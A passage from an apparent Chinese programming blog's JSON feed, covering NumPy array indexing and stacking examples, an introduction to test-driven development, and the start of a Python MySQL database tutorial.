开始</span></pre></td></tr><tr><td data-num=\"82\"></td><td><pre><span class=\"token comment\"># 下标可以使用负数，-1 表示从数组后往前数的第一个元素</span></pre></td></tr><tr><td data-num=\"83\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'索引结果为：'</span><span class=\"token punctuation\">,</span> arr<span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"84\"></td><td><pre></pre></td></tr><tr><td data-num=\"85\"></td><td><pre>arr<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">:</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">100</span><span class=\"token punctuation\">,</span> <span class=\"token number\">101</span></pre></td></tr><tr><td data-num=\"86\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'索引结果为：'</span><span class=\"token punctuation\">,</span> arr<span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 下标还可以用来修改元素的值</span></pre></td></tr><tr><td data-num=\"87\"></td><td><pre><span class=\"token comment\"># 范围中的第三个参数表示步长，2 表示隔一个元素取一个元素</span></pre></td></tr><tr><td data-num=\"88\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'索引结果为：'</span><span class=\"token punctuation\">,</span> arr<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">:</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">:</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"89\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'索引结果为：'</span><span class=\"token punctuation\">,</span> arr<span class=\"token punctuation\">[</span><span class=\"token number\">5</span><span class=\"token punctuation\">:</span><span class=\"token number\">1</span><span class=\"token punctuation\">:</span><span class=\"token operator\">-</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 步长为负数时，开始下标必须大于结束下标</span></pre></td></tr><tr><td data-num=\"90\"></td><td><pre></pre></td></tr><tr><td data-num=\"91\"></td><td><pre><span class=\"token comment\"># 代码 2-19</span></pre></td></tr><tr><td data-num=\"92\"></td><td><pre>arr <span class=\"token operator\">=</span> np<span class=\"token punctuation\">.</span>array<span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token number\">5</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token number\">5</span><span class=\"token punctuation\">,</span> <span class=\"token number\">6</span><span class=\"token punctuation\">,</span> <span class=\"token number\">7</span><span class=\"token punctuation\">,</span> <span class=\"token number\">8</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">[</span><span class=\"token number\">7</span><span class=\"token punctuation\">,</span> <span class=\"token number\">8</span><span class=\"token punctuation\">,</span> <span class=\"token number\">9</span><span class=\"token punctuation\">,</span> <span class=\"token number\">10</span><span class=\"token punctuation\">,</span> <span class=\"token number\">11</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"93\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'创建的二维数组为：'</span><span class=\"token punctuation\">,</span> arr<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"94\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'索引结果为：'</span><span class=\"token punctuation\">,</span> arr<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3</span><span class=\"token punctuation\">:</span><span class=\"token number\">5</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 索引第 0 行中第 3 和第 4 列的元素</span></pre></td></tr><tr><td data-num=\"95\"></td><td><pre><span class=\"token comment\"># 索引第 2 和第 3 行中第 3 列、第 4 列和第 5 列的元素</span></pre></td></tr><tr><td data-num=\"96\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'索引结果为：\\n'</span><span class=\"token punctuation\">,</span> arr<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"97\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'索引结果为：'</span><span class=\"token punctuation\">,</span> arr<span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 索引第 2 列的元素</span></pre></td></tr><tr><td data-num=\"98\"></td><td><pre></pre></td></tr><tr><td data-num=\"99\"></td><td><pre><span class=\"token comment\"># 代码 2-20</span></pre></td></tr><tr><td data-num=\"100\"></td><td><pre><span class=\"token comment\"># 从两个序列的对应位置取出两个整数组成下标：arr [0,1], arr [1,2], arr [2,3]</span></pre></td></tr><tr><td data-num=\"101\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'索引结果为：'</span><span class=\"token punctuation\">,</span> arr<span class=\"token punctuation\">[</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"102\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'索引结果为：'</span><span class=\"token punctuation\">,</span> arr<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 索引第 2、3 行中第 0、2、3 列的元素</span></pre></td></tr><tr><td data-num=\"103\"></td><td><pre></pre></td></tr><tr><td data-num=\"104\"></td><td><pre>mask <span class=\"token operator\">=</span> np<span class=\"token punctuation\">.</span>array<span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> dtype<span class=\"token operator\">=</span>np<span class=\"token punctuation\">.</span><span class=\"token builtin\">bool</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"105\"></td><td><pre><span class=\"token comment\"># mask 是一个布尔数组，它索引第 1、3 行中第 2 列的元素</span></pre></td></tr><tr><td data-num=\"106\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'索引结果为：'</span><span class=\"token punctuation\">,</span> arr<span class=\"token punctuation\">[</span>mask<span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"107\"></td><td><pre></pre></td></tr><tr><td data-num=\"108\"></td><td><pre><span class=\"token comment\"># 代码 2-21</span></pre></td></tr><tr><td data-num=\"109\"></td><td><pre>arr <span class=\"token operator\">=</span> np<span class=\"token punctuation\">.</span>arange<span class=\"token punctuation\">(</span><span class=\"token number\">12</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 创建一维数组</span></pre></td></tr><tr><td data-num=\"110\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'创建的一维数组为：'</span><span class=\"token punctuation\">,</span> arr<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"111\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'新的一维数组为：'</span><span class=\"token punctuation\">,</span> arr<span class=\"token punctuation\">.</span>reshape<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">4</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 设置数组的形状</span></pre></td></tr><tr><td data-num=\"112\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'数组维度为：'</span><span class=\"token punctuation\">,</span> arr<span class=\"token punctuation\">.</span>reshape<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">4</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>ndim<span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 查看数组维度</span></pre></td></tr><tr><td data-num=\"113\"></td><td><pre></pre></td></tr><tr><td data-num=\"114\"></td><td><pre><span class=\"token comment\"># 代码 2-22</span></pre></td></tr><tr><td data-num=\"115\"></td><td><pre>arr <span class=\"token operator\">=</span> np<span class=\"token punctuation\">.</span>arange<span class=\"token punctuation\">(</span><span class=\"token number\">12</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>reshape<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">4</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"116\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'创建的二维数组为：'</span><span class=\"token punctuation\">,</span> arr<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"117\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'数组展平后为：'</span><span class=\"token punctuation\">,</span> arr<span class=\"token punctuation\">.</span>ravel<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"118\"></td><td><pre></pre></td></tr><tr><td data-num=\"119\"></td><td><pre><span class=\"token comment\"># 代码 2-23</span></pre></td></tr><tr><td data-num=\"120\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'数组展平为：'</span><span class=\"token punctuation\">,</span> arr<span class=\"token punctuation\">.</span>flatten<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 横向展平</span></pre></td></tr><tr><td data-num=\"121\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'数组展平为：'</span><span class=\"token punctuation\">,</span> arr<span class=\"token punctuation\">.</span>flatten<span class=\"token punctuation\">(</span><span class=\"token string\">'F'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 纵向展平</span></pre></td></tr><tr><td data-num=\"122\"></td><td><pre></pre></td></tr><tr><td data-num=\"123\"></td><td><pre><span class=\"token comment\"># 代码 2-24</span></pre></td></tr><tr><td data-num=\"124\"></td><td><pre>arr1 <span class=\"token operator\">=</span> np<span class=\"token punctuation\">.</span>arange<span class=\"token punctuation\">(</span><span class=\"token number\">12</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>reshape<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">4</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"125\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'创建的数组1为：'</span><span class=\"token punctuation\">,</span> arr1<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"126\"></td><td><pre></pre></td></tr><tr><td data-num=\"127\"></td><td><pre>arr2 <span class=\"token operator\">=</span> arr1 <span class=\"token operator\">*</span> <span class=\"token number\">3</span></pre></td></tr><tr><td data-num=\"128\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'创建的数组2为：'</span><span class=\"token punctuation\">,</span> arr2<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"129\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'横向组合为：'</span><span class=\"token punctuation\">,</span> np<span class=\"token punctuation\">.</span>hstack<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>arr1<span class=\"token punctuation\">,</span> arr2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># hstack 函数横向组合</span></pre></td></tr><tr><td data-num=\"130\"></td><td><pre></pre></td></tr><tr><td data-num=\"131\"></td><td><pre><span class=\"token comment\"># 代码 2-25</span></pre></td></tr><tr><td data-num=\"132\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'纵向组合为：'</span><span class=\"token punctuation\">,</span> np<span class=\"token punctuation\">.</span>vstack<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>arr1<span class=\"token punctuation\">,</span> arr2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># vstack 函数纵向组合</span></pre></td></tr><tr><td data-num=\"133\"></td><td><pre></pre></td></tr><tr><td data-num=\"134\"></td><td><pre><span class=\"token comment\"># 代码 2-26</span></pre></td></tr><tr><td data-num=\"135\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'横向组合为：'</span><span class=\"token punctuation\">,</span> np<span class=\"token punctuation\">.</span>concatenate<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>arr1<span class=\"token punctuation\">,</span> arr2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> axis<span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># concatenate 函数横向组合</span></pre></td></tr><tr><td data-num=\"136\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'纵向组合为：'</span><span class=\"token punctuation\">,</span> np<span class=\"token punctuation\">.</span>concatenate<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>arr1<span class=\"token punctuation\">,</span> arr2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> axis<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># concatenate 函数纵向组合</span></pre></td></tr><tr><td data-num=\"137\"></td><td><pre></pre></td></tr><tr><td data-num=\"138\"></td><td><pre><span class=\"token comment\"># 代码 2-27</span></pre></td></tr><tr><td data-num=\"139\"></td><td><pre>arr <span class=\"token operator\">=</span> np<span class=\"token punctuation\">.</span>arange<span class=\"token punctuation\">(</span><span class=\"token number\">16</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>reshape<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token number\">4</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"140\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'创建的二维数组为：'</span><span class=\"token punctuation\">,</span> arr<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"141\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'横向分割为：'</span><span class=\"token punctuation\">,</span> np<span class=\"token punctuation\">.</span>hsplit<span class=\"token punctuation\">(</span>arr<span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># hsplit 函数横向分割</span></pre></td></tr><tr><td data-num=\"142\"></td><td><pre></pre></td></tr><tr><td data-num=\"143\"></td><td><pre><span class=\"token comment\"># 代码 2-28</span></pre></td></tr><tr><td data-num=\"144\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'纵向分割为：'</span><span class=\"token punctuation\">,</span> np<span class=\"token punctuation\">.</span>vsplit<span class=\"token punctuation\">(</span>arr<span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># vsplit 函数纵向分割</span></pre></td></tr><tr><td data-num=\"145\"></td><td><pre></pre></td></tr><tr><td data-num=\"146\"></td><td><pre><span class=\"token comment\"># 代码 2-29</span></pre></td></tr><tr><td data-num=\"147\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'横向分割为：'</span><span class=\"token punctuation\">,</span> np<span class=\"token punctuation\">.</span>split<span class=\"token punctuation\">(</span>arr<span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> axis<span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># split 函数横向分割</span></pre></td></tr><tr><td data-num=\"148\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'纵向分割为：'</span><span class=\"token punctuation\">,</span> np<span class=\"token punctuation\">.</span>split<span class=\"token punctuation\">(</span>arr<span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> axis<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># split 函数纵向分割</span></pre></td></tr></table></figure>",
            "tags": [
                "数据分析"
            ]
        },
        {
            "id": "https://or0kit.github.io/Programming/Python/%E5%88%9D%E8%AF%86python%E6%B5%8B%E8%AF%95%E9%A9%B1%E5%8A%A8%E5%BC%80%E5%8F%91/",
            "url": "https://or0kit.github.io/Programming/Python/%E5%88%9D%E8%AF%86python%E6%B5%8B%E8%AF%95%E9%A9%B1%E5%8A%A8%E5%BC%80%E5%8F%91/",
            "title": "初识python测试驱动开发",
            "date_published": "2021-02-07T12:20:18.000Z",
            "content_html": "<h1 id=\"导读\"><a class=\"anchor\" href=\"#导读\">#</a> 导读</h1>\n<p>本章主要介绍敏捷开发模式。敏捷开发是 20 世纪 90 年代兴起的一种新型软件开发方法，能快速应对需求的变化。他需要分析人员与程序开发人员紧密协作，采用面对面的有效沟通方式频繁交付新的软件版本。测试驱动是敏捷开发的重要组成部分，python 是敏捷开发项目常采用的一种语言。本章重点介绍测试驱动开发的特点、步骤和环境建立，以及 Python 单元测试，doctest 和 Epydoc 的使用。</p>\n<h1 id=\"正文\"><a class=\"anchor\" href=\"#正文\">#</a> 正文</h1>\n<h2 id=\"测试驱动开发\"><a class=\"anchor\" href=\"#测试驱动开发\">#</a> 测试驱动开发</h2>\n<p>测试驱动开发 (Test-Driven-Development)，简称 TDD，是一种有别于传统开发的新型开发方法。它要求在编写某个功能的代码之前先编写测试代码，让后编写是测试通过的代码，通过测试来推动整个开发的进行。这有助于编写简洁可用和高质量的代码，以便加速开发进程。</p>\n<h3 id=\"测试驱动开发模式tdd\"><a class=\"anchor\" href=\"#测试驱动开发模式tdd\">#</a> 测试驱动开发模式 (TDD)</h3>\n<p>当下科技高速发展，软件规模越来越大，软件开发人员也越来越多，因此软件开发过程必须要有知道开发的软件模式。一些小项目也许可以采用边做边改的开发模式，项目一旦做大，这样的开发模式就不能满足需求了。</p>\n<p>瀑布模型作为传统的开发模式，曾一度受到追捧，它将软件生命周期划外为制定计划，需求分析、软件设计、程序开发、软件测试和运行维护六个阶段，这六个阶段的各项活动严格按照线性方式进行，每一个阶段的工作成果都需要进行验证，验证通过才能进入下一阶段，否则返回修改。</p>\n<p>传统的开发模型除了瀑布模型外，还有造代模型、快速原型模型、增量模型、螺旋模型，但这些模型都有自身的缺点，如何适应瞬息万变的需求变化，如何高效地实施软件开发，是每个软件行业人员必须思考的问题。</p>\n<p>敏捷开发在这样的环境下应运而生，它是一种以人为核心、迭代、循序渐进的开发方法，开发过程中，软件项目的构建被切分成多个子项目，各个子项目既相对独立又相互联系，可以分别完成，开发过程中软件一直处于可使用状态。</p>\n<p>测试驱动开发模式 TDD 是敏捷开发的重要组成部分，也是一种设计方法论，其基本思想就是在开发某个功能代码前，先编写测试代码，然后编写功能代码并用测试代码进行验证，如此循环直到完成全部功能的开发。</p>\n<p>测试模型中的 V 模型和 X 模型都是 TDD 的最好体现方式，V 模型如图所示：</p>\n<p><img data-src=\"image001.png\" alt=\"\" /></p>\n<p>V 模型在开发的各个阶段，包括需求分析、概要设计、详细设计、编码过程中都考虑相对应的测试工作，完成相关的测试用例设计和测试脚本编写。</p>\n<p>X 模型是对详细阶段和编码阶段进行建模，针对某个功能进行对应的测试驱动开发。X 模型的左侧描述的是针对单独程序片段所进行的相互分离的编码和测试，此后进行频繁的集成，通过集成最终成为可执行的程序，然后再对这些可执行程序进行测试. X 模型还定位了探索性测试，这是不进行事先计划的特殊类型的测试，这一方式往往能帮助有经验的测试人员在测试计划之外发现更多的软件错误。</p>\n<p>X 模型如图所示</p>\n<p><img data-src=\"image002.png\" alt=\"\" /></p>\n<p>TDD 的优点：节省了调试程序及挑错的时间，在任意一个开发节点都可以拿出一个可以使用含少量 bug 并具有一定功能和能够发布的产品。<br />\nTDD 的缺点：增加代码量，测试代码是系统代码的两倍或更多倍。</p>\n<h3 id=\"tdd使用步骤\"><a class=\"anchor\" href=\"#tdd使用步骤\">#</a> TDD 使用步骤</h3>\n<p>TDD 在满足软件开发目标的同时，也要实现代码的简单整洁。<br />\n在明确软件需求后，对一个新功能的开发过程包括以下步骤，如图 4-3 所示。<br />\n步骤 01: 明确当前代码要完成的功能。可以记录成一个列表，必要时需写相关接口。<br />\n步骤 02: 快速新增对要完成功能的测试。<br />\n步骤 03 : 运行测试，判断测试代码是否通过，通过则执行步骤 06, 不通过则执行步骤 04。<br />\n步骤 04: 编写对应的功能代码。<br />\n步骤 05 : 重新运行测试，保证全部通过。<br />\n步骤 06: 对代码进行重构，优化代码结构。<br />\n步骤 07: 循环完成所有功能的开发。</p>\n<p><img data-src=\"image003.png\" alt=\"\" /></p>\n<h3 id=\"tips\"><a class=\"anchor\" href=\"#tips\">#</a> Tips</h3>\n<p>要完成一个系统，代码的功能点可能很多，需求也可能随时变化，任何阶段想添加功能，都应吧相关的功能点加到测试列表中，避免疏漏。</p>\n<h2 id=\"unittest测试框架\"><a class=\"anchor\" href=\"#unittest测试框架\">#</a> unittest 测试框架</h2>\n<h1 id=\"reference\"><a class=\"anchor\" href=\"#reference\">#</a> Reference</h1>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20veW91bGl4aXNoaS9hcnRpY2xlcy8zNTUxOTkyLmh0bWw=\">https://www.cnblogs.com/youlixishi/articles/3551992.html</span><br />\n《python 网络编程从入门到精通》</p>\n",
            "tags": [
                "测试"
            ]
        },
        {
            "id": "https://or0kit.github.io/Programming/Python/python%E6%95%B0%E6%8D%AE%E5%BA%93%E7%BC%96%E7%A8%8B/",
            "url": "https://or0kit.github.io/Programming/Python/python%E6%95%B0%E6%8D%AE%E5%BA%93%E7%BC%96%E7%A8%8B/",
            "title": "python数据库编程",
            "date_published": "2021-02-07T08:36:30.000Z",
            "content_html": "<h1 id=\"前言\"><a class=\"anchor\" href=\"#前言\">#</a> 前言</h1>\n<p>在看《python 网络编程从入门到精通》，顺便做个笔记。</p>\n<h1 id=\"正文\"><a class=\"anchor\" href=\"#正文\">#</a> 正文</h1>\n<p><ins>本章以 MySQL 为例说明</ins></p>\n<p>python 操作数据库主要涉及 connection 和 cursor 两个对象，操作流程图如下：</p>\n<p><img data-src=\"image001.png\" alt=\"\" /></p>\n<h2 id=\"connection对象\"><a class=\"anchor\" href=\"#connection对象\">#</a> connection 对象</h2>\n<p>connection 对象，与数据源唯一的会话，可以使用 connection 对象的集合、方法、属性实现与数据的连接。</p>\n<p><span class=\"label\">connection 参数列表</span></p>\n<table>\n<tbody>\n<tr>\n<td style=\"text-align:left\">参数名</td>\n<td style=\"text-align:left\">类型</td>\n<td style=\"text-align:left\">说明</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">host</td>\n<td style=\"text-align:left\">字符串</td>\n<td style=\"text-align:left\">连接数据库服务器主机名，默认为本地主机 (localhost)</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">port</td>\n<td style=\"text-align:left\">数字</td>\n<td style=\"text-align:left\">MySQL 服务器端口号，默认是 3306</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">user</td>\n<td style=\"text-align:left\">字符串</td>\n<td style=\"text-align:left\">连接数据库的用户名</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">password</td>\n<td style=\"text-align:left\">字符串</td>\n<td style=\"text-align:left\">连接数据库的密码</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">db</td>\n<td style=\"text-align:left\">字符串</td>\n<td style=\"text-align:left\">数据库名称</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">charset</td>\n<td style=\"text-align:left\">字符串</td>\n<td style=\"text-align:left\">连接编码</td>\n</tr>\n</tbody>\n</table>\n<p><span class=\"label\">connection 方法列表</span></p>\n<table>\n<tbody>\n<tr>\n<td style=\"text-align:left\">方法名</td>\n<td style=\"text-align:left\">说明</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">cursor()</td>\n<td style=\"text-align:left\">使用该连接创建并返回游标</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">commit()</td>\n<td style=\"text-align:left\">提交当前事务</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">rollback()</td>\n<td style=\"text-align:left\">回滚当前事务</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">close()</td>\n<td style=\"text-align:left\">关闭连接</td>\n</tr>\n</tbody>\n</table>\n<h2 id=\"cursor对象\"><a class=\"anchor\" href=\"#cursor对象\">#</a> cursor 对象</h2>\n<p>cursor 对象是游标对象，用户可以用它查询和获取结果。</p>\n<p><span class=\"label\">cursor 对象方法列表</span></p>\n<table>\n<tbody>\n<tr>\n<td style=\"text-align:left\">方法名</td>\n<td style=\"text-align:left\">说明</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">execute</td>\n<td style=\"text-align:left\">执行一个数据库命令</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">fecthone</td>\n<td style=\"text-align:left\">取结果集下一行</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">fechmany(size)</td>\n<td style=\"text-align:left\">取结果集下几行</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">fechall()</td>\n<td style=\"text-align:left\">取结果集中剩余的所有行</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">rowcount</td>\n<td style=\"text-align:left\">最近一次 execute 返回数据的行数或影响行数</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">close()</td>\n<td style=\"text-align:left\">关闭游标对象</td>\n</tr>\n</tbody>\n</table>\n<h2 id=\"一个例子\"><a class=\"anchor\" href=\"#一个例子\">#</a> 一个例子</h2>\n<p>搬一个菜鸟教程里<ins>插入操作</ins>的例子。</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#!/usr/bin/python</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\"># -*- coding: UTF-8 -*-</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">import</span> MySQLdb</pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\"># 打开数据库连接</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>db <span class=\"token operator\">=</span> MySQLdb<span class=\"token punctuation\">.</span>connect<span class=\"token punctuation\">(</span><span class=\"token string\">\"localhost\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"testuser\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"test123\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"TESTDB\"</span><span class=\"token punctuation\">,</span> charset<span class=\"token operator\">=</span><span class=\"token string\">'utf8'</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td 